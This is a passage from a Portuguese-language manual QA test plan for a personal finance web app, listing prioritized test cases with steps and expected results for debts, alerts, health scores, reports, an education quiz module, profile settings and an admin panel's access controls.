**Pré-condições:** Transação mensal com `recurrenceEndsAt` = 3 meses à frente
**Passos:**
1. Verificar projeções mês a mês
**Resultado esperado:** Transação aparece nos 3 meses até o encerramento. No 4º mês, não aparece mais.

---

### P-04 — Distribuição correta de parcelas
**Prioridade:** ALTO
**Pré-condições:** Parcelamento de 3x criado no mês atual
**Passos:**
1. Verificar projeções dos 3 meses
**Resultado esperado:** Cada parcela aparece apenas no seu respectivo mês. Sem duplicatas ou ausências.

---

## 8. Passivos

### L-01 — Criar passivo completo
**Prioridade:** ALTO
**Pré-condições:** Usuário logado, em `/liabilities`
**Passos:**
1. Abrir formulário de novo passivo
2. Nome: `Cartão Nubank`, Tipo: `Crédito rotativo`, Saldo: `5000`, Taxa: `12.9`, Mínimo: `200`
3. Salvar
**Resultado esperado:** Passivo criado. Cards de resumo atualizados. Previsão de quitação calculada.

---

### L-02 — Verificar alerta crítico: mínimo não cobre juros
**Prioridade:** CRÍTICO
**Pré-condições:** Passivo com saldo `R$ 10.000`, taxa `15% a.m.`, mínimo `R$ 500`
**Passos:**
1. Verificar o card do passivo
**Resultado esperado:** Juros mensais = R$ 1.500. Mínimo de R$ 500 < R$ 1.500. Alerta vermelho exibido: "Mínimo não cobre os juros — essa dívida nunca será quitada assim".

---

### L-03 — Verificar previsão de quitação (cores)
**Prioridade:** MÉDIO
**Pré-condições:** 3 passivos: 1 quitável em 6 meses, 1 em 24 meses, 1 em 48 meses
**Passos:**
1. Verificar cor da previsão de cada passivo
**Resultado esperado:** 6 meses = verde. 24 meses = âmbar. 48 meses = vermelho.

---

### L-04 — Marcar passivo como quitado
**Prioridade:** MÉDIO
**Pré-condições:** Passivo ativo existente
**Passos:**
1. Clicar em "Marcar como quitada" no card do passivo
**Resultado esperado:** Passivo movido para seção "Quitadas". Não aparece mais nos cards de resumo como dívida ativa.

---

### L-05 — Reativar passivo quitado
**Prioridade:** MÉDIO
**Pré-condições:** Passivo quitado existente
**Passos:**
1. Localizar o passivo na seção "Quitadas"
2. Clicar em editar
3. Alterar status para ativo
**Resultado esperado:** Passivo retorna para a lista de ativos. Cards de resumo atualizam.

---

### L-06 — Modo Recuperação: ordenação por maior taxa
**Prioridade:** ALTO
**Pré-condições:** 3 passivos com taxas diferentes: 3% a.m., 8% a.m., 5% a.m.
**Passos:**
1. Expandir seção "Modo Recuperação"
2. Verificar ordem de prioridade
**Resultado esperado:** Ordem: 8% (1ª prioridade), 5% (2ª), 3% (3ª). Badges "1ª", "2ª", "3ª" visíveis.

---

### L-07 — Calculadora de pagamento extra
**Prioridade:** MÉDIO
**Pré-condições:** Modo Recuperação expandido com passivos ativos
**Passos:**
1. Inserir valor extra de `R$ 300/mês` na calculadora
**Resultado esperado:** Passivo prioritário mostra redução de meses calculada. Os demais mantêm apenas o mínimo. Sem crash com qualquer valor positivo.

---

### L-08 — Calculadora com extra maior que saldo devedor
**Prioridade:** MÉDIO
**Pré-condições:** Passivo com saldo `R$ 500`
**Passos:**
1. Inserir valor extra de `R$ 5.000/mês`
**Resultado esperado:** Sistema exibe "quitado no próximo mês" ou similar. Sem valor negativo de meses ou crash.

---

### L-09 — Passivo com taxa zero
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar passivo com taxa `0%` a.m., saldo `R$ 2.400`, mínimo `R$ 200`
**Resultado esperado:** Passivo criado. Sem alerta "mínimo não cobre juros" (juros = 0). Previsão de quitação = 12 meses.

---

### L-10 — Passivo com taxa extrema (100% a.m.)
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar passivo com taxa `100% a.m.`, saldo `R$ 1.000`, mínimo `R$ 100`
**Resultado esperado:** Passivo criado. Alerta "mínimo não cobre juros" ativo (juros = R$ 1.000 > mínimo R$ 100). Sem crash no cálculo.

---

## 9. Alertas

### AL-01 — Estado vazio "Tudo em ordem"
**Prioridade:** MÉDIO
**Pré-condições:** Nenhuma condição de alerta ativa (orçamento sem estouro, metas em dia, etc.)
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Ícone de sino verde e mensagem de confirmação positiva. Nenhum card de alerta.

---

### AL-02 — Alerta de orçamento aviso (80%)
**Prioridade:** ALTO
**Pré-condições:** Alocação de R$ 800 para "Despesa variável". Gasto real de R$ 650 (81%).
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Card de alerta com ícone âmbar, badge "Orçamento — Aviso", descrição indicando a categoria e percentual. Link para `/budget`.

---

### AL-03 — Alerta de orçamento crítico (100%)
**Prioridade:** ALTO
**Pré-condições:** Alocação de R$ 800. Gasto real de R$ 900.
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Card de alerta com ícone vermelho, badge "Orçamento — Crítico", valor de estouro indicado.

---

### AL-04 — Alerta de passivo crítico (cheque especial)
**Prioridade:** CRÍTICO
**Pré-condições:** Passivo tipo "Cheque especial" com saldo `R$ 500` e taxa `12% a.m.`
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Card de alerta vermelho "Passivo Crítico". Exibe taxa de `12% a.m.` e equivalente anual calculado por juros compostos (`(1,12)^12 − 1 = 286% a.a.`).

---

### AL-05 — Passivo crítico com saldo zero não gera alerta
**Prioridade:** ALTO
**Pré-condições:** Passivo tipo "Cheque especial" marcado como quitado (saldo = 0)
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Nenhum alerta de passivo crítico. O alerta só é gerado para passivos com saldo > 0.

---

### AL-06 — Alerta desaparece quando condição é resolvida
**Prioridade:** ALTO
**Pré-condições:** Alerta de orçamento crítico ativo (gasto > alocação)
**Passos:**
1. Excluir a transação que causou o estouro
2. Voltar para `/alerts`
**Resultado esperado:** Alerta de orçamento desaparece. Se não há outros alertas, exibe "Tudo em ordem".

---

### AL-07 — Alerta sazonal (vencimento em ≤ 2 meses)
**Prioridade:** MÉDIO
**Pré-condições:** Despesa anual com vencimento em 2 meses
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Card de alerta âmbar "Sazonal — Aviso" com nome da despesa, valor e meses restantes.

---

### AL-08 — Alerta sazonal com vencimento hoje (BVA = 0)
**Prioridade:** MÉDIO
**Pré-condições:** Despesa anual com vencimento no dia atual
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Alerta sazonal gerado (0 meses = dentro do threshold de ≤ 2 meses). Badge "Urgente" ou equivalente.

---

### AL-09 — Múltiplos alertas do mesmo tipo
**Prioridade:** MÉDIO
**Pré-condições:** 3 categorias com orçamento estourado
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** 3 cards de alerta separados, um para cada categoria. Chip de contagem indica "3" para alertas de orçamento.

---

### AL-10 — Todos os tipos de alerta ativos simultaneamente
**Prioridade:** ALTO
**Pré-condições:** Configurar: orçamento estourado + meta em atraso + projeção negativa + sazonal próximo + passivo crítico
**Passos:**
1. Acessar `/alerts`
**Resultado esperado:** Todos os alertas exibidos. Alertas críticos antes dos avisos. Chips com contagens corretas por tipo. Sem crash ou sobreposição visual.

---

### AL-11 — Agrupamento por severidade
**Prioridade:** MÉDIO
**Pré-condições:** Mix de alertas críticos e de aviso
**Passos:**
1. Verificar a ordem dos alertas na página
**Resultado esperado:** Todos os alertas críticos (🔴) aparecem antes dos alertas de aviso (⚠).

---

## 10. Saúde Financeira

### S-01 — Score com zero transações (usuário novo)
**Prioridade:** ALTO
**Pré-condições:** Usuário sem nenhuma transação no mês atual
**Passos:**
1. Acessar `/health`
**Resultado esperado:** Score exibido (provavelmente 0 ou valor mínimo). Gauge SVG renderiza sem crash. Cada dimension card explica que não há dados suficientes, sem exibir `NaN` ou `Infinity`.

---

### S-02 — Gauge SVG animado
**Prioridade:** BAIXO
**Pré-condições:** Usuário com transações no mês
**Passos:**
1. Acessar `/health`
2. Observar o gauge ao carregar
**Resultado esperado:** Ponteiro anima do 0 até o score calculado. Animação suave, sem travamento.

---

### S-03 — Perfil "Em Recuperação" (0–39)
**Prioridade:** MÉDIO
**Pré-condições:** Dados que resultem em score entre 0 e 39 (ex: resultado negativo + alta dívida)
**Passos:**
1. Verificar perfil exibido em `/health`
**Resultado esperado:** Badge vermelho "Em Recuperação". Faixa de pontos do perfil exibida.

---

### S-04 — Perfil "Estabilizado" (40–59)
**Prioridade:** MÉDIO
**Pré-condições:** Dados que resultem em score entre 40 e 59
**Passos:**
1. Verificar perfil em `/health`
**Resultado esperado:** Badge âmbar "Estabilizado".

---

### S-05 — Perfil "Em Construção" (60–79)
**Prioridade:** MÉDIO
**Pré-condições:** Dados que resultem em score entre 60 e 79
**Passos:**
1. Verificar perfil
**Resultado esperado:** Badge cyan "Em Construção".

---

### S-06 — Perfil "Livre" (80–100)
**Prioridade:** MÉDIO
**Pré-condições:** Dados que resultem em score entre 80 e 100
**Passos:**
1. Verificar perfil
**Resultado esperado:** Badge verde "Livre".

---

### S-07 — Dimensão Comprometimento acima de 30%
**Prioridade:** ALTO
**Pré-condições:** Receita R$ 5.000. Dívidas totalizando R$ 2.000/mês comprometidos (40%).
**Passos:**
1. Verificar Dimension Card de Comprometimento
**Resultado esperado:** Pontuação abaixo do máximo de 30 pts. Descrição indica comprometimento excessivo.

---

### S-08 — Mês sem receita mas com despesas (poupança 0/0)
**Prioridade:** ALTO
**Pré-condições:** Mês com apenas despesas, sem nenhuma receita registrada
**Passos:**
1. Verificar score de Saúde Financeira
**Resultado esperado:** Dimensão Poupança = 0 pontos (sem receita = sem poupança possível). Sem divisão por zero ou `NaN`. Score total calculável.

---

### S-09 — Declarar reserveBalance inline
**Prioridade:** ALTO
**Pré-condições:** Usuário com score calculado via proxy
**Passos:**
1. Localizar o editor inline de reserva na página `/health`
2. Inserir valor `15000` (R$ 15.000)
3. Salvar
**Resultado esperado:** Valor salvo. Dimensão Reserva recalculada usando R$ 15.000 como base. Score total atualiza.

---

### S-10 — reserveBalance altera pontuação da dimensão Reserva
**Prioridade:** ALTO
**Pré-condições:** Despesa média mensal = R$ 3.000. reserveBalance = R$ 6.000 (2 meses de reserva).
**Passos:**
1. Verificar pontuação da dimensão Reserva
2. Alterar reserveBalance para `R$ 18.000` (6 meses)
3. Verificar pontuação novamente
**Resultado esperado:** Com R$ 6.000 (2 meses): pontuação baixa. Com R$ 18.000 (6 meses): pontuação máxima de 20 pts.

---

### S-11 — Sem reserveBalance usa proxy debit_longterm
**Prioridade:** MÉDIO
**Pré-condições:** Campo `reserveBalance` não preenchido (null). Histórico de `debit_longterm` de R$ 10.000 acumulados.
**Passos:**
1. Verificar dimensão Reserva sem reserveBalance declarado
**Resultado esperado:** Sistema usa R$ 10.000 (proxy histórico) para calcular cobertura. Cálculo funciona corretamente sem erro.

---

### S-12 — Tip prioritizado pela dimensão mais fraca
**Prioridade:** MÉDIO
**Pré-condições:** Dimensão Reserva com menor pontuação de todas
**Passos:**
1. Verificar banner de dica em `/health`
**Resultado esperado:** A dica aborda especificamente a dimensão Reserva (a mais fraca). Não exibe dica aleatória.

---

## 11. Relatórios

### R-01 — Selecionar período e verificar DRE
**Prioridade:** ALTO
**Pré-condições:** Transações em pelo menos 2 meses
**Passos:**
1. Acessar `/reports`
2. Selecionar mês e ano específicos com transações
**Resultado esperado:** DRE exibe todas as categorias com transações naquele período. Valores absolutos e percentuais sobre a receita.

---

### R-02 — Mês sem transações
**Prioridade:** ALTO
**Pré-condições:** Selecionar mês sem nenhuma transação
**Passos:**
1. Navegar para um mês sem transações em `/reports`
**Resultado esperado:** DRE exibe todas as categorias com valor R$ 0,00. Percentuais exibem `0%` ou `--`, não `NaN`. Resultado líquido = R$ 0,00.

---

### R-03 — Apenas receitas (sem despesas)
**Prioridade:** MÉDIO
**Pré-condições:** Mês com apenas transações de crédito
**Passos:**
1. Selecionar esse mês em `/reports`
**Resultado esperado:** Categorias de despesa exibem R$ 0,00. Resultado líquido = Receita total. Sem crash.

---

### R-04 — Resultado líquido negativo
**Prioridade:** MÉDIO
**Pré-condições:** Mês com despesas maiores que receitas
**Passos:**
1. Selecionar esse mês
**Resultado esperado:** Resultado líquido exibido em vermelho com valor negativo. Ex: `-R$ 500,00`.

---

### R-05 — Receita zero com despesas (percentuais indefinidos)
**Prioridade:** ALTO
**Pré-condições:** Mês com despesas mas sem receita
**Passos:**
1. Selecionar esse mês em `/reports`
**Resultado esperado:** Percentuais exibem `--` ou `∞` de forma controlada, não `NaN` ou `Infinity`. Sem crash.

---

### R-06 — Verificar percentuais corretos
**Prioridade:** MÉDIO
**Pré-condições:** Receita = R$ 5.000. Despesa fixa = R$ 1.500.
**Passos:**
1. Verificar o percentual da categoria "Despesa fixa"
**Resultado esperado:** `30,0%` (1500 / 5000). Percentuais somam corretamente.

---

## 12. Reembolsos

### RE-01 — Marcar despesa como reembolsada
**Prioridade:** MÉDIO
**Pré-condições:** Transação reembolsável existente em `/reimbursements`
**Passos:**
1. Localizar a despesa em "Aguardando reembolso"
2. Clicar em "Marcar como recebida"
**Resultado esperado:** Despesa movida para seção "Reembolsadas" com badge verde e data do recebimento registrada automaticamente.

---

### RE-02 — Desfazer marcação de reembolso
**Prioridade:** MÉDIO
**Pré-condições:** Despesa marcada como reembolsada
**Passos:**
1. Clicar em "Desfazer" na despesa reembolsada
**Resultado esperado:** Despesa volta para "Aguardando reembolso". Data de recebimento removida.

---

### RE-03 — Despesa não reembolsável não aparece
**Prioridade:** MÉDIO
**Pré-condições:** Transação de débito criada sem o toggle reembolsável ativo
**Passos:**
1. Verificar lista em `/reimbursements`
**Resultado esperado:** A transação sem o toggle não aparece em nenhuma das listas de reembolsos.

---

### RE-04 — Verificar cards de resumo
**Prioridade:** MÉDIO
**Pré-condições:** Mix de despesas pendentes e reembolsadas
**Passos:**
1. Verificar os 3 cards em `/reimbursements`
**Resultado esperado:** "A receber" = soma de pendentes. "Já reembolsado" = soma de recebidas. "Total" = soma dos dois.

---

## 13. Tags

### TG-01 — Criar tag com preview em tempo real
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado, em `/tags`
**Passos:**
1. Abrir formulário de nova tag
2. Nome: `Carro`, Cor: azul, Ícone: carro
3. Verificar preview enquanto preenche
**Resultado esperado:** Chip de preview atualiza em tempo real com a cor e ícone selecionados.

---

### TG-02 — Tentar criar tag com nome duplicado
**Prioridade:** ALTO
**Pré-condições:** Tag "Carro" já existe para o usuário
**Passos:**
1. Tentar criar nova tag com nome `Carro`
**Resultado esperado:** Erro indicando que o nome já existe para este usuário. Tag não criada.

---

### TG-03 — Editar tag existente
**Prioridade:** MÉDIO
**Pré-condições:** Tag existente
**Passos:**
1. Editar nome, cor e ícone de uma tag
2. Salvar
**Resultado esperado:** Alterações refletidas na listagem e nos chips de transações que usam essa tag.

---

### TG-04 — Excluir tag com vínculos
**Prioridade:** ALTO
**Pré-condições:** Tag vinculada a 3 transações
**Passos:**
1. Excluir a tag
**Resultado esperado:** Tag removida. As 3 transações permanecem intactas mas sem o chip daquela tag. Nenhuma transação é excluída.

---

## 14. Instituições

### I-01 — Criar instituição e adicionar conta
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado, em `/institutions`
**Passos:**
1. Criar instituição: Nome `Nubank`, Tipo `Fintech`
2. Expandir o card da instituição
3. Adicionar conta: Tipo `Conta Corrente`, Saldo `R$ 3.200`
**Resultado esperado:** Instituição criada com conta vinculada. Card expandido exibe a conta com saldo.

---

### I-02 — Excluir instituição (cascade)
**Prioridade:** ALTO
**Pré-condições:** Instituição com conta e passivo vinculado
**Passos:**
1. Excluir a instituição
**Resultado esperado:** Instituição e suas contas removidas. Passivo vinculado permanece mas sem a FK da instituição (campo fica null). Transações vinculadas às contas permanecem sem o vínculo de conta.

---

### I-03 — Verificar passivos vinculados no card
**Prioridade:** MÉDIO
**Pré-condições:** Passivo vinculado à instituição
**Passos:**
1. Expandir card da instituição
**Resultado esperado:** Seção de passivos exibe o passivo vinculado com nome e saldo.

---

## 15. Bens e Imóveis

### B-01 — Criar imóvel com endereço
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado, em `/assets`
**Passos:**
1. Criar bem tipo Imóvel
2. Preencher endereço, valor de compra `R$ 350.000`, valor atual `R$ 420.000`
**Resultado esperado:** Bem criado. Card expandido exibe variação de valor em verde (R$ +70.000).

---

### B-02 — Adicionar despesa e marcar como paga
**Prioridade:** MÉDIO
**Pré-condições:** Bem criado
**Passos:**
1. Adicionar despesa de IPTU, valor `R$ 1.800`, vencimento no próximo mês
2. Marcar como paga
**Resultado esperado:** Data de pagamento registrada. Toggle muda para estado pago. Total "pago" do bem atualiza.

---

### B-03 — Verificar alerta de despesa vencida
**Prioridade:** MÉDIO
**Pré-condições:** Despesa com vencimento no passado e status pendente
**Passos:**
1. Verificar o bem no dashboard ou na lista de despesas
**Resultado esperado:** Despesa vencida com fundo vermelho de alerta. Widget no dashboard exibe badge de pendentes.

---

### B-04 — Excluir bem (cascade)
**Prioridade:** MÉDIO
**Pré-condições:** Bem com 3 despesas associadas
**Passos:**
1. Excluir o bem
**Resultado esperado:** Bem e todas as despesas removidos. Widget do dashboard atualiza (desaparece se era o único bem).

---

## 16. Educação

### ED-01 — Acessar hub de educação
**Prioridade:** ALTO
**Pré-condições:** Usuário logado com score de saúde calculado
**Passos:**
1. Acessar `/education`
**Resultado esperado:** Hub carrega com as 5 trilhas. A trilha correspondente ao perfil atual está destacada como "Recomendada".

---

### ED-02 — Verificar trilha recomendada baseada no score
**Prioridade:** ALTO
**Pré-condições:** Score do usuário entre 60–79 (perfil "stable")
**Passos:**
1. Verificar qual trilha está destacada em `/education`
**Resultado esperado:** Trilha "Estável" destacada. As outras 4 trilhas exibidas sem destaque.

---

### ED-03 — Verificar barra de progresso por trilha
**Prioridade:** MÉDIO
**Pré-condições:** 2 pílulas da trilha "stable" concluídas de um total de 20
**Passos:**
1. Verificar barra de progresso da trilha
**Resultado esperado:** Barra exibe 10% (2/20). Contador visível.

---

### ED-04 — Abrir pílula e verificar seções tipadas
**Prioridade:** ALTO
**Pré-condições:** Nenhuma pílula concluída
**Passos:**
1. Clicar em qualquer pílula no hub
2. Verificar as seções do conteúdo
**Resultado esperado:** Seções com estilos visuais distintos: `concept` (neutro), `why` (fundo âmbar), `how` (fundo verde). Conteúdo legível.

---

### ED-05 — Responder quiz — opção correta
**Prioridade:** ALTO
**Pré-condições:** Pílula não concluída, aberta em `/education/[pillId]`
**Passos:**
1. Rolar até o final da pílula
2. Clicar no botão "Responder Quiz"
3. Verificar abertura do modal com a pergunta e as opções
4. Clicar na opção correta
**Resultado esperado:** Modal avança automaticamente para etapa de correção. Header do modal fica verde com "Resposta correta!". A opção selecionada destaca em verde com ícone ✓. Botão "Continuar" disponível.

---

### ED-06 — Responder quiz — opção incorreta
**Prioridade:** ALTO
**Pré-condições:** Pílula não concluída, modal de quiz aberto (etapa "quiz")
**Passos:**
1. Clicar em "Responder Quiz" para abrir o modal
2. Clicar em uma opção incorreta
**Resultado esperado:** Modal avança para etapa de correção. Header fica vermelho com "Resposta incorreta". Opção clicada destacada em vermelho com ícone ✗. Opção correta destacada em verde. Feedback textual de cada opção visível. Botão "Continuar" disponível.

---

### ED-07 — Bloqueio de opções na etapa de correção
**Prioridade:** MÉDIO
**Pré-condições:** Modal de quiz na etapa de correção (resposta já selecionada)
**Passos:**
1. Tentar clicar em qualquer outra opção na etapa de correção
**Resultado esperado:** Nenhuma ação. Todas as opções têm `disabled` e `cursor-default`. A seleção original não muda. Não há retorno à etapa de quiz.

---

### ED-08 — Concluir pílula pela primeira vez
**Prioridade:** CRÍTICO
**Pré-condições:** Pílula não concluída, modal de quiz na etapa de correção
**Passos:**
1. Clicar em "Responder Quiz"
2. Selecionar qualquer opção
3. Na etapa de correção, clicar em "Continuar"
4. Verificar etapa "Pílula concluída!" no modal
5. Clicar em "Continuar" no modal de conclusão
**Resultado esperado:** Etapa 3→4: action `completePill` é chamada, registro salvo em `PillProgress`. Etapa "Pílula concluída!" exibe tempo de leitura (≥ segundos reais) e resultado do quiz. Etapa 5: redirecionamento para `/education`. Barra de progresso da trilha no hub aumenta em 1 unidade.

---

### ED-09 — Pílula já concluída — modo releitura
**Prioridade:** ALTO
**Pré-condições:** Pílula já concluída anteriormente
**Passos:**
1. Acessar novamente a mesma pílula em `/education/[pillId]`
2. Verificar banner no topo
3. Verificar botão ao final da pílula
4. Clicar em "Rever Quiz"
5. Selecionar qualquer opção
6. Na etapa de correção, clicar em "Continuar"
**Resultado esperado:** Passo 2: banner verde com data de conclusão, tempo e resultado do quiz anterior. Passo 3: botão exibe "Rever Quiz" (tom neutro, sem cyan). Passo 4: modal abre normalmente. Passo 6: redirecionamento para `/education` sem criar novo registro em `PillProgress`.

---

### ED-10 — alreadyCompleted: true — sem duplicata no banco
**Prioridade:** CRÍTICO
**Pré-condições:** Pílula já concluída
**Passos:**
1. Forçar chamada da action `completePill` para a mesma pílula (via DevTools ou segundo clique rápido)
**Resultado esperado:** Retorno `{ alreadyCompleted: true }`. Nenhum registro duplicado criado em `PillProgress`.

---

### ED-11 — Sugestão de próxima pílula no hub
**Prioridade:** MÉDIO
**Pré-condições:** Pílula concluída com pílulas subsequentes na mesma trilha
**Passos:**
1. Concluir uma pílula (completar fluxo do modal até "Continuar" na etapa de conclusão)
2. Verificar o `NextPillCard` no topo de `/education`
3. Clicar em qualquer área do card (ícone, título, categoria, seta)
**Resultado esperado:** Passo 2: card exibe título, categoria e tempo da próxima pílula não concluída. Passo 3: qualquer clique em qualquer ponto do card navega para a pílula correta (toda a área é clicável).

---

### ED-12 — Streak semanal: contagem correta
**Prioridade:** ALTO
**Pré-condições:** Pílulas concluídas em 4 semanas consecutivas
**Passos:**
1. Verificar o contador de streak no hub
**Resultado esperado:** Streak exibido como "4 semanas". Histórico de 12 semanas mostra 4 blocos coloridos consecutivos.

---

### ED-13 — Semana corrente sem atividade não quebra streak
**Prioridade:** ALTO
**Pré-condições:** Streak de 3 semanas. Nenhuma pílula concluída na semana atual ainda.
**Passos:**
1. Verificar o streak no hub
**Resultado esperado:** Streak ainda mostra 3 semanas. A semana atual não quebra o contador enquanto ainda não terminou.

---

### ED-14 — Trilha muda quando score de saúde muda
**Prioridade:** ALTO
**Pré-condições:** Score atual entre 60–79 (perfil "stable"). Trilha "stable" destacada.
**Passos:**
1. Adicionar transações que mudem o score para abaixo de 40 (perfil "critical")
2. Recarregar `/education`
**Resultado esperado:** Trilha "critical" agora destacada como recomendada. Trilha "stable" perde o destaque.

---

### ED-15 — Timer silencioso registrado corretamente
**Prioridade:** MÉDIO
**Pré-condições:** Pílula não concluída
**Passos:**
1. Abrir pílula
2. Aguardar 30 segundos
3. Clicar em "Responder Quiz"
4. Selecionar qualquer opção
5. Na etapa de correção, clicar em "Continuar"
6. Verificar `timeSpentSeconds` no `PillProgress` via Studio ou banco
**Resultado esperado:** `timeSpentSeconds` salvo é ≥ 30 segundos. O tempo exibido na etapa "Pílula concluída!" do modal bate com o valor registrado no banco.

---

### ED-16 — Fluxo completo do modal de quiz
**Prioridade:** CRÍTICO
**Pré-condições:** Pílula não concluída, usuário logado
**Passos:**
1. Abrir pílula em `/education/[pillId]`
2. Rolar até o final — verificar botão "Responder Quiz" (cyan, com ícone)
3. Clicar em "Responder Quiz" — verificar abertura do modal
4. Verificar etapa 1 do modal: pergunta + 4 opções desbloqueadas + botão X para fechar
5. Selecionar uma opção — verificar avanço automático para etapa de correção
6. Verificar etapa 2: header verde/vermelho, opções travadas com gabarito, botão "Continuar"
7. Clicar em "Continuar" — verificar avanço para etapa de conclusão
8. Verificar etapa 3: ícone ✅, "Pílula concluída!", tempo de leitura, resultado do quiz, botão "Continuar"
9. Clicar em "Continuar" — verificar redirecionamento
**Resultado esperado:** Cada etapa transita corretamente. Na etapa 7, a action `completePill` é chamada e o botão fica "Registrando..." durante o submit. Na etapa 9, redirecionamento para `/education`. Fechar o modal pelo X na etapa 1 fecha sem salvar.

---

### ED-17 — NextPillCard: área inteira clicável
**Prioridade:** MÉDIO
**Pré-condições:** Pelo menos 1 pílula concluída, com pílulas subsequentes na trilha
**Passos:**
1. Acessar `/education`
2. Clicar no ícone de play (círculo cyan) do NextPillCard
3. Voltar e clicar no título da pílula
4. Voltar e clicar na área de categoria/tempo
5. Voltar e clicar na seta (›)
6. Voltar e clicar no espaço vazio entre os elementos
**Resultado esperado:** Todos os cliques dos passos 2 a 6 navegam para a mesma pílula. Nenhuma área do card é inerte.

---

## 17. Perfil

### PF-01 — Upload de avatar
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado, em `/profile`
**Passos:**
1. Selecionar uma imagem PNG de 1MB+
2. Fazer upload
**Resultado esperado:** Imagem redimensionada para 200×200px no cliente. Avatar atualizado no canto superior direito (UserMenu). Sem envio de arquivo original ao servidor.

---

### PF-02 — Auto-fill via ViaCEP
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado em `/profile`
**Passos:**
1. Inserir CEP: `01310-100` (Av. Paulista, SP)
2. Clicar no ícone de lupa ou pressionar Enter
**Resultado esperado:** Campos Logradouro, Cidade e Estado preenchidos automaticamente. Campo Número/Complemento permanece vazio para preenchimento manual.

---

### PF-03 — CEP inválido
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado em `/profile`
**Passos:**
1. Inserir CEP: `00000-000`
2. Acionar auto-fill
**Resultado esperado:** Mensagem de erro indicando CEP não encontrado. Campos de endereço permanecem como estavam.

---

### PF-04 — Trocar senha com senha atual correta
**Prioridade:** ALTO
**Pré-condições:** Senha atual: `123456`
**Passos:**
1. Preencher "Senha atual": `123456`
2. Preencher "Nova senha": `novaSenha789`
3. Salvar
**Resultado esperado:** Senha alterada. Fazer logout e login com `novaSenha789` funciona. Login com `123456` falha.

---

### PF-05 — Trocar senha com senha atual incorreta
**Prioridade:** ALTO
**Pré-condições:** Senha atual: `123456`
**Passos:**
1. Preencher "Senha atual": `errada123`
2. Preencher "Nova senha": `novaSenha789`
3. Salvar
**Resultado esperado:** Erro "Senha atual incorreta". Senha não alterada.

---

## 18. Studio

### ST-01 — Acessar Studio sem senha
**Prioridade:** ALTO
**Pré-condições:** Sem cookie de sessão do Studio
**Passos:**
1. Acessar `http://localhost:3000/studio`
**Resultado esperado:** Formulário de senha do Studio exibido. Conteúdo do painel não visível.

---

### ST-02 — Login no Studio com senha correta
**Prioridade:** ALTO
**Pré-condições:** `ADMIN_SECRET` configurado no `.env`
**Passos:**
1. Inserir a senha configurada em `ADMIN_SECRET`
2. Clicar em entrar
**Resultado esperado:** Acesso ao painel com as abas Schema, Docs, Usuários e Dados.

---

### ST-03 — Tentar login com senha incorreta
**Prioridade:** ALTO
**Pré-condições:** Nenhuma
**Passos:**
1. Inserir senha incorreta no formulário do Studio
**Resultado esperado:** Mensagem de erro "Senha incorreta". Acesso negado. Cookie de admin não criado.

---

### ST-04 — Sessão de usuário normal persiste após entrar no Studio
**Prioridade:** MÉDIO
**Pré-condições:** Usuário normal logado
**Passos:**
1. Em nova aba, acessar `/studio` e fazer login com senha de admin
2. Voltar para a aba do usuário normal
3. Acessar `/dashboard`
**Resultado esperado:** Sessão do usuário normal permanece ativa. Dashboard carrega normalmente.

---

### ST-05 — Logout do Studio encerra ambas as sessões
**Prioridade:** ALTO
**Pré-condições:** Usuário normal logado e Studio logado
**Passos:**
1. Fazer logout no Studio
**Resultado esperado:** Cookie do Studio removido. Cookie do usuário normal também removido. Redirecionamento para `/`. Tentar acessar `/dashboard` redireciona para `/login`.

---

### ST-06 — Criar usuário com e-mail já existente
**Prioridade:** ALTO
**Pré-condições:** Usuário com e-mail `teste@lyfx.com` já cadastrado
**Passos:**
1. Na aba Usuários do Studio, criar novo usuário com e-mail `teste@lyfx.com`
**Resultado esperado:** Erro indicando e-mail duplicado. Segundo usuário não criado.

---

### ST-07 — Deletar usuário e verificar cascade completo
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário com transações, tags, metas, passivos, bens e configurações criadas
**Passos:**
1. Deletar o usuário no Studio com confirmação inline
2. Verificar banco via aba Schema ou `/api`
**Resultado esperado:** Usuário removido. Verificar que as seguintes tabelas não contêm mais registros do usuário deletado: `Transaction`, `Tag`, `Budget`, `Goal`, `GoalPayment`, `Settings`, `Liability`, `Institution`, `Account`, `Asset`, `AssetExpense`, `PillProgress`.

---

### ST-08 — Acessar /studio com sessão de usuário normal (sem cookie admin)
**Prioridade:** ALTO
**Pré-condições:** Usuário normal logado, sem sessão de Studio
**Passos:**
1. Acessar diretamente `http://localhost:3000/studio`
**Resultado esperado:** Formulário de senha do Studio exibido. O cookie de sessão do usuário normal não concede acesso ao Studio.

---

### ST-09 — Verificar que sessão Studio expira após 2h
**Prioridade:** MÉDIO
**Pré-condições:** Studio logado
**Passos:**
1. Aguardar 2 horas (ou manipular data do cookie para simular expiração)
2. Tentar acessar uma ação do Studio
**Resultado esperado:** Sessão expirada. Redirecionamento para formulário de senha.

---

### ST-10 — requireAdmin em Server Action do Studio
**Prioridade:** CRÍTICO
**Pré-condições:** Sem cookie de admin válido
**Passos:**
1. Via DevTools ou fetch, chamar diretamente uma Server Action do Studio (ex: `adminResetPassword`) sem o cookie de admin
**Resultado esperado:** Action retorna erro de autorização (ex: 401 ou throw). Operação não executada.

---

### ST-11 — Renderização do DOCUMENTATION.md na aba Docs
**Prioridade:** BAIXO
**Pré-condições:** Studio logado
**Passos:**
1. Acessar aba Docs
2. Clicar em item do TOC lateral
**Resultado esperado:** Documentação renderizada com Markdown. Scroll suave até o heading selecionado. Índice exibe h2, h3 e h4 com indentação progressiva.

---

## 19. Fluxos Transversais End-to-End

### FT-A — Transação e seus efeitos em cascata
**Prioridade:** CRÍTICO
**Pré-condições:** Alocação de R$ 800 para "Despesa variável". Meta ativa. Score calculado.
**Passos:**
1. Criar transação de débito "Despesa variável" de `R$ 750`
